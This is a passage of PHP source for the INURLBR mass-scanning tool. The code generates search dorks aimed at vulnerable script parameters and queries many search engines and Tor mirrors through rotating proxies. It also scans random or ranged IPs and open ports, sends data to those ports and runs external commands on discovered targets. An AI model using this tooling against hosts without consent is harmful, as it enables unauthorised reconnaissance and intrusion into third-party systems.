        $bloc[1] = rand(0, 255);
        $bloc[2] = rand(0, 255);
        $bloc[3] = rand(0, 255);
        $ip[] = "http://{$bloc[0]}.{$bloc[1]}.{$bloc[2]}.{$bloc[3]}";
        $cont[0] ++;
    }
    return array_unique($ip);
}

################################################################################
#ACESSING FILE ROBOTS###########################################################
################################################################################

function __getValuesRobots($url) {

    $_[0] = "http://" . __filterHostname($url) . "/robots.txt";
    $_[0] = __request_info($_[0], $_SESSION["config"]["proxy"], NULL);
    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ ACCESSING FILE ROBOTS ]::\n";

    if (not_isnull_empty($_[0]['corpo']) && $_[0]['server']['http_code'] == 200) {

        $_[1] = array_unique(array_filter(explode("\n", $_[0]['corpo'])));

        foreach ($_[1] as $value) {

            if (strstr($value, 'Disallow:') || strstr($value, 'Allow:')) {

                echo "|_[ + ]__|[ value={$value}\n";
                __saveValue($_SESSION['config']['arquivo_output'], $value, 2);
            }
            __plus();
        }
    } else {

        echo "\t[x][ ERRO ] LOAD FILE ROBOTS.TXT [ COD_HTTP ]:: {$_[0]['server']['http_code']}\n{$_SESSION["c0"]}";
    }
}

################################################################################
#Base64 string encryption md5 , hexadecimal, hex, base64 & random string########
################################################################################

function __crypt($url) {

    preg_match_all("#(md5|base64|hex|random)(\()(.*?)(\))#", $url, $_);
    $cont = 0;

    foreach ($_[0] as $replace) {

        if (strstr($replace, 'md5('))
            $func = 'md5';

        if (strstr($replace, 'base64('))
            $func = 'base64_encode';

        if (strstr($replace, 'hex('))
            $func = 'bin2hex';

        if (strstr($replace, 'random('))
            $func = 'random';

        $url = str_replace($replace, $func($_[3][$cont]), $url);
        $cont ++;
    }
    return $url;
}

################################################################################
#GENERATE RANDOM STRING#########################################################
################################################################################
#(PHP4,PHP5) Shuffle an array http://php.net/manual/en/function.shuffle.php

function random($__) {
    $_ = 'A,a,B,b,C,c,D,d,E,e,F,f,G,g,';
    $_.= 'H,h,I,i,J,j,K,k,L,l,M,m,';
    $_.= '1,2,3,4,5,6,7,8,9,0';
    $_ = explode(',', $_);
    shuffle($_);
    $_ = implode($_, '');
    return substr($_, 0, $__);
}

################################################################################
#GENERATE RANDOM DORKS##########################################################
################################################################################

function __randomDork($_) {

    $dk[1] = array('view', 'page', 'index', 'file', 'ver', 'web', 'form', 'public', 'map', 'visit',
        'site', 'perfil', 'sistema', 'system', 'cad', 'frm', 'content', 'conteudo', 'graf', 'page',
        'search', 'arch', 'class', 'app', 'galeria', 'text', 'noticia', 'default', 'storytopic', 'home',
        'lenoticia', 'counter', 'todos', 'all', 'principal', 'main', 'pesquisa', 'dir', 'category', 'news_more',
        'info', 'display', 'showrecord', 'download', 'sum', 'produtos', 'Menu', 'guia', 'product', 'about',
        'WebForms', 'proj', 'inter', 'PageText', 'topper', 'notes', 'name', 'redirect', 'open_link', 'artist',
        'curricu', 'resumen', 'top', 'list', 'directorio', 'Project', 'membre', 'photos', 'Contenido',
        'presentation', 'component', 'release', 'article', 'asesores', 'Detail', 'about', 'lire', 'story',
        'memoriam', 'transport', 'journal', 'album', 'community', 'includes', 'ler', 'video', 'configs', 'refer',
        'form_cpf', 'atualiza', 'refresh', 'materia', 'fotos', 'photos', 'itemdetail', 'listcategoriesandproduct',
        'myaccount', 'learnmore', 'powersearch', 'prodbycat', 'prodetails', 'prodlist', 'productDisplay', 'promotion',
        'pview', 'resellers', 'inc', 'oferta', 'layout', 'standard', 'blank', 'path', 'declaration', 'newsitem', 'games',
        'buy', 'readnews', 'event', 'news_view', 'communique_detail', 'kategorie', 'preview', 'faq2', 'comment', 'newsDetail',
        'shopping', 'shop_category', 'product_ranges_view', 'section', 'ages', 'curriculum', 'galeri_info', 'tekst', 'play_old',
        'viewapp', 'padrao', 'sitio', 'head', 'template', 'index1', 'index2', 'index3', 'index4', 'index5', 'mod', 'press', 'gery',
        'index_table', 'mainfile', '_functions', 'phpshop', 'new-visitor.inc', 'Packages', 'editor', 'board', 'advanced', 'pref',
        'q', 'side', 'home1', 'home2', 'home3', 'getbook', 'checkout', 'affiliate', 'addcart', 'product_info', 'showsub', 'library',
        'edition', 'get', 'temp', 'catalog', 'press2', 'company', 'jobs', 'review', 'input', 'cats', 'showmedia', 'event_info'
    );


    $dk[2] = array('view', 'file', 'ver', 'web', 'form', 'public', 'map', 'site', 'perfil', 'bookid',
        'sistema', 'system', 'cad', 'frm', 'content', 'id', 'action', 'user', 'option', 'area', 'catalogid',
        'tp', 'pg', 'p', 'v', 'a', 't', 'r', 'o', 'm', 'n', 'sec', 'lang', 'search', 'Itemid', 'open',
        'servicoid', 'id_ap', 'artic', 'pag', 'archive', 'ind', 'sigl', 'url', 'link', 'tp', 'cd', 'item_ID',
        'web', 'sourc', 'sitemap', 'go', 'galeria', 'img', 'notic', 'num', 'ter', 'dow', 'type', 'CartId',
        'redir', 'default', 'storytopic', 'topic', 'cod_noti', 'detalhe', 'ler', 'storyid', 'start',
        'click', 'title', 'tmpl', 'templat', 'cont', 'corp', 'contat', 'consult', 'main', 'exib', 'guia',
        'span', 'OpenDocument', 'document', 'codidem', 'pesq', 'print', 'imprimir', 'jobs', 'pic', 'contri',
        'code', 'myPage', 'openPage', 'homepage', 'home', 'inner', 'custom', 'bin', 'IsisScript', 'pid',
        'wxis.exe', 'wood', 'modules', 'kbn', 'chid', 'jump', 'mes', 'ano', 'month', 'year', 'day', 'dia', 'pre',
        'show', 'download', 'summit', 'new', 'coming', 'Category', 'produtos', 'Menu', 'uid', 'Consulta', 'qry',
        'product', 'WebForms', 'proj', 'inter', 'scgi', 'orig_q', 'b1', 'showpage', 'filter', 'Detail', 'about',
        'itemlist', 'memor', 'info', 'website', 'cidade', 'lic', 'materia', 'SEC_', 'includes', 'store', 'ler',
        'reader', 'src', 'theme', 'Boletim', 'busca', 'date', 'video', 'configs', 'exec', 'doc', 'refresh', 'telec',
        'digital', 'materia', 'portal', 'shop', 'photos', 'sales', 'open', 'check', 'token', 'general', 'process', 'ViewType',
        'idCategor', 'intCatalogID', 'Cart', 'maingroup', 'play', 'where', 'mod', 'panel', 'str', 'staff_id', 'buy', 'preview',
        'chapter', 'club_id', 'GLOBALS', 'absolute_path', 'body', 'from', 'pg_ID', 'load', 'systempath', 'conf', 'do', 'x', 'temp',
        'see', 'act', 'middle', 'content', 'q', 'my', 'to', 'nivel', 'arq', 'modo', 'rss', 'pagina', 'opcion', 'loader', 'l', 'this',
        'subject', 'param', 'index', 'tipo', 'second', 'loc', 'cat_id', 'magazin', 'artist_art', 'cID', 'cat', 'message_id', ''
    );

    $dk[3] = array('aspx', 'asp', 'cfm', 'php', 'php3', 'pl', 'cgi', 'py', 'jsp');

    for ($i = 0; $i <= $_; $i++) {

        $dm = NULL;
        $da = $dk[1][rand(0, count($dk[1]) - 1)];
        $dg = $dk[2][rand(0, count($dk[2]) - 1)];
        $de = $dk[3][rand(0, count($dk[3]) - 1)];

        $__[] = "\"{$dm}/{$da}.{$de}?{$dg}\"";
    }
    return $__;
}

################################################################################
#VALIDATING OPEN DOORS##########################################################
################################################################################
#(PHP 4, PHP 5) fsockopen — Open Internet or Unix domain socket connection
#http://php.net/manual/en/function.fsockopen.php

function __portScan($_) {

    // FORMAT PORTS 80, 8181, 22, 21
    $ports = explode(',', $_[1]);
    echo "\n{$_SESSION["c1"]}|_[ * ]__\n";
    echo "         |[ PROCESS PORT-SCAN ]::\n";
    foreach ($ports as $value) {

        $conc = fsockopen($_SESSION['config']['server_ip'], $value, $_[2], $_[3], 30);
        // HOST, POST, ERROR1, ERROR3, TIMEOUT

        __plus();

        if ($conc) {

            echo "{$_SESSION["c1"]}|_[ + ]__|[ {$value}=\033[1m\033[32mOPEN{$_SESSION["c0"]}";
            (not_isnull_empty($_SESSION['config']['port-write']) ? __portWrite($conc, $_SESSION['config']['port-write']) : NULL);
            __saveValue($_SESSION['config']['arquivo_output'], "{$value}=OPEN", 2);

            __plus();
            $_[0]['url_port'] = $value;
            (not_isnull_empty($_SESSION['config']['port-cmd']) ? __command($_SESSION['config']['port-cmd'], $_[0]) : NULL);
            __plus();
        } else {

            echo "{$_SESSION["c1"]}|_[ x ]__|[ {$value}={$_SESSION["c9"]}CLOSED{$_SESSION["c0"]}\n";
            __plus();
        }
    }
    echo $_SESSION["c0"];
    fclose($conc);
}

################################################################################
#WRITING ON THE DOOR############################################################
################################################################################
#(PHP 4, PHP 5) fwrite — Binary-safe file write
#http://php.net/manual/pt_BR/function.fwrite.php

function __portWrite($conect, $valores) {

    $valores = explode(',', $valores);
    foreach ($valores as $value) {

        echo "{$_SESSION["c1"]}|_[ + ]__|[ WRITE SEND={$value}{$_SESSION["c0"]}\n";
        fwrite($conect, "{$value}\r\n") . sleep(3);
        __plus();
    }
}

################################################################################
#CODE SEARCH ENGINES############################################################
################################################################################
//$_SESSION['config']['cod'] = ' 

function __engines($dork, $list_proxy) {

    $dork_ = (not_isnull_empty($dork)) ? $dork : __getOut("DEFINA SUA DORK\n");
    $list_proxy_ = (!is_null($list_proxy) ? $list_proxy[rand(0, count($list_proxy) - 1)] : NULL);

    $confArray = array("list_proxy_rand" => $list_proxy_, "list_proxy_file" => $list_proxy);

    (!is_null($_SESSION["config"]["tor-random"]) && !is_null($_SESSION["config"]["proxy"]) ? __renewTOR() : NULL);

    echo "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ SEARCHING ]:: {$_SESSION["c1"]}{{$_SESSION["c0"]} ";

    __plus();

    echo (!is_null($list_proxy_) ? "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ PROXY FILE RANDOM ]:: {$_SESSION["c1"]}[ {$list_proxy_} ]{$_SESSION["c0"]} " : NULL );

################################################################################
# SEARCH ENGINE :::  google
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $randHost = __dominioGoogleRandom();
        $_SESSION["config"]["dork_tmp"] = $dork_;
        $_SESSION["config"]["conf_array_tmp"] = $confArray;
        __pageEngine($confArray, "GOOGLE - {$randHost}", "https://{$randHost}/search?q=[DORK]&num=1500&btnG=Search&pws=1", $dork_, $postDados, 0, 0, 1);
    }


################################################################################
# SEARCH ENGINE :::  bing
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 2) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "BING", "http://www.bing.com/search?q=[DORK]&&filt=rf&first=[PAG]", $dork_, $postDados, 1, 991, 50);
    }

################################################################################
# SEARCH ENGINE :::  yahoo
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 3) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YAHOO BR", "http://search.yahoo.com/search?p=[DORK]&ei=UTF-8&b=[PAG]", $dork_, $postDados, 1, 471, 10);
    }

################################################################################
# SEARCH ENGINE :::  ask
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 4) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ASK", "http://www.ask.com/web?q=[DORK]&page=[PAG]&qid=[RANDOM]", $dork_, $postDados, 0, 16, 1);
    }

################################################################################
# SEARCH ENGINE :::  hao123
################################################################################


    if (__validateOptions($_SESSION["config"]["motor"], 5) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "HAO123 BR", "http://search.hao123.com.br/s?tn=[RANDOM]&f=0&wd=[DORK]&haobd=[RANDOM]FG=1&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 550, 10);
    }

################################################################################
# SEARCH ENGINE :::  googleapis 
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], 6) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "GOOGLE API", "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&rsz=8&q=[DORK]&start=[PAG]&userip=[IP]&filter=1&safe=off", $dork_, $postDados, 0, 56, 4);
    }

################################################################################
# SEARCH ENGINE :::  lycos
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 7) || __validateOptions($_SESSION["config"]["motor"], "all")) {
        $_ = __request_info("http://search.lycos.com", $_SESSION["config"]["proxy"], $postDados);
        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);

        __pageEngine($confArray, "LYCOS", "http://search.lycos.com/web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}&pn=[PAG]", $dork_, $postDados, 0, 24, 1);
    }

################################################################################
# SEARCH ENGINE :::  uol.com.br
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 8) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "UOL BR", "http://busca.uol.com.br/web/?q=[DORK]&start=[PAG]", $dork_, $postDados, 10, 130, 10);
    }

################################################################################
# SEARCH ENGINE :::  us.yhs4.search.yahoo
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 9) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YAHOO US", "http://us.yhs4.search.yahoo.com/yhs/search?p=[DORK]&fr=goodsearch-yhsif&b=[PAG]", $dork_, $postDados, 1, 551, 10);
    }

################################################################################
# SEARCH ENGINE :::  sapo.pt
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 10) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "SAPO", "http://pesquisa.sapo.pt/?adultfilter=strict&barra=resumo&cluster=0&format=html&limit=10&location=pt&page=[PAG]&q=[DORK]&st=web", $dork_, $postDados, 0, 14, 1);
    }

################################################################################
# SEARCH ENGINE :::  dmoz
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 11) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "DMOZ", "http://www.dmoz.org/search/search?q=[DORK]&start=[PAG]&type=next&all=yes&cat=", $dork_, $postDados, 0, 800, 20);
    }

################################################################################
# SEARCH ENGINE :::  gigablast
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 12) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "GIGABLAST", "http://www.gigablast.com/search?k3h=223119&s=22&rat=0&sc=1&ns=100&n=100&sites=&q=[DORK]", $dork_, $postDados, 0, 1, 1);
    }

################################################################################
# SEARCH ENGINE :::  web.search.naver.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 13) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "NEVER", "http://web.search.naver.com/search.naver?where=webkr&query=[DORK]&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=[PAG]", $dork_, $postDados, 1, 500, 10);
    }

################################################################################
# SEARCH ENGINE :::  br.baidu.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 14) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "BAIDU BR", "http://www.baidu.com.br/s?usm=1&rn=100&wd=[DORK]&ie=utf-8&pn=[PAG]&showTop=0", $dork_, $postDados, 0, 1500, 100);
    }

################################################################################
# SEARCH ENGINE :::  www.yandex.ru
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 15) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "YANDEX", "http://yandex.ru/yandsearch?text=[DORK]&p=[PAG]&lr=10136", $dork_, $postDados, 0, 30, 1);
    }

################################################################################
# SEARCH ENGINE :::  www.zoo.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 16) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ZOO", "http://www.zoo.com/Zoo-Site/search/web?qsi=[PAG2]&q=[DORK]&p=[PAG]&fcoid=4&fpid=2", $dork_, $postDados, 1, 211, 20, 10);
    }

################################################################################
# SEARCH ENGINE :::  www.hotbot.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 17) || __validateOptions($_SESSION["config"]["motor"], "all")) {
        $_ = __request_info("http://www.hotbot.com/", $_SESSION["config"]["proxy"], $postDados);
        $_SESSION["config"]["idPesquisaLycos"] = __getIdSearchLycos($_["corpo"]);
        __pageEngine($confArray, "HOTBOT", "http://www.hotbot.com/search/web?pn=[PAG]web?q=[DORK]&keyvol={$_SESSION["config"]["idPesquisaLycos"]}", $dork_, $postDados, 0, 24, 1);
    }

################################################################################
# SEARCH ENGINE :::  www.zhongsou.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 18) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "ZHONGSOU", "http://www.zhongsou.com/third?w=[DORK]&b=[PAG]", $dork_, $postDados, 1, 50, 1);
    }

################################################################################
# SEARCH ENGINE :::  hksearch.timway.com
################################################################################
    if (__validateOptions($_SESSION["config"]["motor"], 19) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "HKSEARCH", "http://hksearch.timway.com/search.php?query=[DORK]&region=zh-hant-hk&p=[PAG]", $dork_, $postDados, 1, 12, 1);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / USA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION USA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=usa&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / ASIA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION ASIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=asia&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / EUROPA
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION EUROPA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=eu&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  find.ezilon.com / INDIA
################################################################################
    if (__validateOptions($_SESSION["config"]["motor"], 20) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "EZILION INDIA", "http://find.ezilon.com/search.php?q=[DORK]&start=[PAG]&t=&v=in&f=", $dork_, $postDados, 0, 215, 15);
    }

################################################################################
# SEARCH ENGINE :::  www.sogou.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 21) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        __pageEngine($confArray, "SOGOU", "http://www.sogou.com/web?query=[DORK]&page=[pag]&ie=utf8", $dork_, $postDados, 1, 20, 1);
    }

################################################################################
# SEARCH ENGINE :::  api.duckduckgo.com
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 22) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $postDados = TRUE;
        __pageEngine($confArray, "DUCK DUCK GO", "https://api.duckduckgo.com/html/?q=[DORK]&kl=en-us&p=-1&s=[PAG]&dc=[PAG3]&o=json&api=d.js", $dork_, $postDados, 0, 800, 50, 0, 37);
    }

################################################################################
# SEARCH ENGINE :::  boorow
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 23) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $postDados = TRUE;
        __pageEngine($confArray, "BOOROW", "http://boorow.com/Pages/site_br_aspx?query=[DORK]", $dork_, $postDados, 0, 0, 1);
    }

################################################################################
# SEARCH ENGINE ::: Google Generic RANDOM
################################################################################

    if (__validateOptions($_SESSION["config"]["motor"], 24) || __validateOptions($_SESSION["config"]["motor"], 1) || __validateOptions($_SESSION["config"]["motor"], "all")) {

        $randHost = __dominioGoogleRandom();
        $randGeneric = __googleGenericRandom();
        __pageEngine($confArray, "GOOGLE_GENERIC_RANDOM - {$randHost} ID: {$randGeneric}", "http://{$randHost}/cse?cx={$randGeneric}&q=[DORK]&num=500&hl=en&as_qdr=all&start=[PAG]&sa=N", $dork_, $postDados, 0, 5, 1);
    }


#===============================================================================
#===============================================================================
#===============================================================================
#======================[ MOTORES DE BUSCA ESPECIAIS  ]==========================
#===============================================================================
#===============================================================================
#===============================================================================
#===============================================================================
# SEARCH ENGINE :::  ndj6p3asftxboa7j.tor2web.org / Tor find ===================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e1")) {

        __pageEngine("TOR FIND", "https://ndj6p3asftxboa7j.tor2web.org/search.php?search_query=[DORK]&page_num=[PAG]&domainchoice=onion", $dork_, $postDados, 1, 5, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  elephantjmjqepsw.tor2web.org ==============================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e2")) {

        __pageEngine("ELEPHANT", "https://elephantjmjqepsw.tor2web.orgsearch?q=[DORK]&page=[PAG]", $dork_, $postDados, 0, 29, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  kbhpodhnfxl3clb4.tor2web.org ==============================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e3")) {

        __pageEngine("TORSEARCH", "https://kbhpodhnfxl3clb4.tor2web.org/en/search?j=f&page=[PAG]&q=[DORK]&utf8=%E2%9C%93", $dork_, $postDados, 0, 10, 1);
    }

#===============================================================================
# SEARCH ENGINE :::  search.wikileaks.org ======================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e4")) {

        __pageEngine("WIKILEAKS", "https://search.wikileaks.org/?page=[PAG]&q=[DORK]&sort=0#results", $dork_, $postDados, 1, 60, 1);
    }

#===============================================================================
# SEARCH ENGINE ::: oth.net ====================================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e5")) {

        __pageEngine("OTN", "http://oth.net/s/s?q=[DORK]&cl=1&skip=[PAG]", $dork_, $postDados, 1, 211, 20);
    }

#===============================================================================
# SEARCH ENGINE ::: exploits.shodan.io =========================================
#===============================================================================

    if (__validateOptions($_SESSION["config"]["motor"], "e6")) {

        __pageEngine("EXPLOITS SHODAN", "https://exploits.shodan.io/?q=[DORK]&p=[PAG]", $dork_, $postDados, 1, 25, 1);
    }

    __plus();
}

################################################################################
#INITIAL INFORMATION############################################################
################################################################################

function __startingBanner() {

    echo "\n{$_SESSION["c1"]}[ ! ] Starting SCANNER INURLBR 2.1 at [" . date("d-m-Y H:i:s") . "]{$_SESSION["c9"]}
[ ! ] legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal. 
It is the end user's responsibility to obey all applicable local, state and federal laws.
Developers assume no liability and are not responsible for any misuse or damage caused by this program{$_SESSION["c0"]}\n";

    $file = not_isnull_empty($_SESSION['config']['arquivo_output']) ? $_SESSION['config']['arquivo_output'] : NULL;
    $file_all = not_isnull_empty($_SESSION['config']['arquivo_output_all']) ? $_SESSION['config']['arquivo_output_all'] : NULL;
    $command = not_isnull_empty($_SESSION['config']['command-vul']) ? $_SESSION['config']['command-vul'] : $_SESSION['config']['command-all'];
    $subcommand = not_isnull_empty($_SESSION['config']['sub-cmd-vul']) ? $_SESSION['config']['sub-cmd-vul'] : $_SESSION['config']['sub-cmd-all'];

    echo (not_isnull_empty($_SESSION['config']['ifemail']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER EMAIL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifemail']} ]{$_SESSION["c0"]}" : NULL);

    echo (is_array($_SESSION['config']['dork-file']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORK FILE ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-file']} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['dork-rand']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DORKS GENERATED ]::{$_SESSION["c1"]}[ {$_SESSION['config']['dork-rand']} ]{$_SESSION["c0"]}" : NULL);

    echo (is_array($_SESSION['config']['irc']['conf']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ SEND VULN IRC ]::{$_SESSION["c1"]}[ server: {$_SESSION['config']['irc']['conf'][0]} / channel: {$_SESSION['config']['irc']['conf'][1]} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['ifurl']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILTER URL ]::{$_SESSION["c1"]}[ {$_SESSION['config']['ifurl']} ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($file) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ]::{$_SESSION["c1"]} [ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file}  ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($file_all) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ OUTPUT FILE ALL ]::{$_SESSION["c1"]}[ " . getcwd() . "/{$_SESSION['config']['out_put_paste']}{$file_all}  ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($command) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL COMMAND ]::{$_SESSION["c1"]} [ $command ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($subcommand) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ DEFINED EXTERNAL SUB_COMMAND ]::{$_SESSION["c1"]} [ $subcommand ]{$_SESSION["c0"]}" : NULL);

    echo (not_isnull_empty($_SESSION['config']['proxy-file']) ?
            "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c16"]}[ FILE SOURCE LIST OF PROXY ]::{$_SESSION["c1"]} [ {$_SESSION['config']['proxy-file']} ]{$_SESSION["c0"]}" : NULL);
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################
################################################################################
# (PHP 4 >= 4.0.1, PHP 5) create_function — Create an anonymous (lambda-style) 
# function http://php.net/manual/en/function.create-function.php

function __main($dork, $motor, $cod) {

    $dork_[0] = (strstr($dork, '[DORK]') ? explode('[DORK]', $dork) : array($dork));
    $dork_[1] = (not_isnull_empty($_SESSION['config']['dork-file']) ? __openFile($_SESSION['config']['dork-file'], 1) : $dork_[0]);
    $dork_[2] = (not_isnull_empty($_SESSION['config']['dork-rand']) ? __randomDork($_SESSION['config']['dork-rand']) : array());
    $dork_[3] = array_filter(array_unique(array_merge($dork_[0], $dork_[1], $dork_[2])));

    $file_proxy = (not_isnull_empty($_SESSION['config']['proxy-file']) ? __openFile($_SESSION['config']['proxy-file'], 1) : NULL);
    $list_proxy = (is_array($file_proxy) ? ($file_proxy) : NULL);

    print __bannerLogo();

    __startingBanner();

    for ($i = 0; $i <= count($dork_[3]); $i++) {

        if (!empty($dork_[3][$i])) {

            echo "\n{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c16"]}[ DORK ]::{$_SESSION["c1"]}[ {$dork_[3][$i]} ]\n";

            //$objNewSearch = create_function('$dork_, $motor, $list_proxy', $cod);
            //$objNewSearch(urlencode($dork_[3][$i]), $motor, $list_proxy);
		
            __engines(urlencode($dork_[3][$i]), $list_proxy) . __plus();

            ($_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;
            ($_SESSION["config"]["pr"]) ? $_SESSION["config"]["totas_urls"] = NULL : NULL;

            echo "\n";
        }
    }

    (!$_SESSION["config"]["pr"]) ? __process(explode("\n", $_SESSION["config"]["totas_urls"])) . __plus() : NULL;

    __exitProcess();
}

################################################################################
#RUN VALIDATION / PROCESSES SCAN RANG IP########################################
################################################################################

if (not_isnull_empty($_SESSION['config']['range']) || not_isnull_empty($_SESSION['config']['range-rand'])) {

    print __bannerLogo();
    __startingBanner();
    not_isnull_empty($_SESSION['config']['range']) ? __process(__generatorRangeIP($_SESSION['config']['range'])) : NULL;
    not_isnull_empty($_SESSION['config']['range-rand']) ? __process(__generatorIPRandom(array(1 => $_SESSION['config']['range-rand']))) : NULL;
    __exitProcess();
}


################################################################################
#RUN VALIDATION / PROCESSES WITH FILE###########################################
################################################################################

if (not_isnull_empty($_SESSION['config']['abrir-arquivo'])) {

    print __bannerLogo();
    __startingBanner();
    __openFile($_SESSION['config']['abrir-arquivo']);
    __plus();
    __exitProcess();
}

################################################################################
#RUN WITH SEARCH ENGINES########################################################
################################################################################

__main($_SESSION['config']['dork'], $_SESSION['config']['motor'], $_SESSION['config']['cod']);

function __extra() {

    $banners = array(
        "{$_SESSION["c1"]}
_ _  _ _  _ ____ _    ___  ____ 
| |\ | |  | |__/ |    |__] |__/ 
| | \| |__| |  \ |___ |__] |  \ 
", "{$_SESSION["c1"]}
 (        )         (    (          (     
 )\ )  ( /(         )\ ) )\ )   (   )\ )  
(()/(  )\())    (  (()/((()/( ( )\ (()/(  
 /(_))((_)\     )\  /(_))/(_)))((_) /(_)) 
(_))   _((_) _ ((_)(_)) (_)) ((_)_ (_))   
|_ _| | \| || | | || _ \| |   | _ )| _ \  
 | |  | .` || |_| ||   /| |__ | _ \|   /  
|___| |_|\_| \___/ |_|_\|____||___/|_|_\ 
 ", "{$_SESSION["c1"]}
.-..-. .-..-. .-..----. .-.   .----. .----. 
| ||  `| || { } || {}  }| |   | {}  }| {}  }
| || |\  || {_} || .-. \| `--.| {}  }| .-. \
